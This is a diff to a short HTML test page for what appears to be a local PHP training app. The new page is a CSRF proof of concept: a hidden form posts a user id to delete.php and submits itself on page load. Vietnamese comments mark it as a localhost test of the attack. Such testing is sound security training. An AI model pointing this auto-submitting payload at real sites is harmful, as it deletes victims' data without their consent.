@@ -1,7 +1,11 @@
-<form action="http://localhost/php_training/logout.php" method="POST">
-    <input type="hidden" name="id" value="1">
-    <button type="submit">Fake CSRF Logout</button>
+<!-- csrf_test.html -->
+<form action="http://localhost/php_training/delete.php" method="POST">
+    <!-- Thay đổi id người dùng muốn test trong môi trường localhost -->
+    <input type="hidden" name="id" value="3">
+    <button type="submit">Test CSRF Delete ở User có ID = 3</button>
 </form>
+
 <script>
+    // Tự động submit form khi mở trang (giống tấn công CSRF)
     document.forms[0].submit();
 </script>
